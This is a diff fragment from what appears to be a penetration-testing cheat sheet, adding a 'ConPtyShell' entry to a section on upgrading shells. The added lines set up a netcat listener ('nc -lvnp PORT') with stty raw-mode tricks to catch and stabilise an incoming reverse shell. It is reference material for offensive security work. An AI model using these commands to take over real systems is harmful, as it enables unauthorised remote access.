@@ -1001,6 +1001,20 @@ script -q /dev/null -c bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
+ConPtyShell:
+
+```c
+stty raw -echo; (stty size; cat) | nc -lvnp PORT
+```
+
+```c
+stty size
+nc -lvnp PORT
+// Wait For connection
+ctrl+z
+stty raw -echo; fg[ENTER]
+```
+
 ### Oneliner
 
 ```c
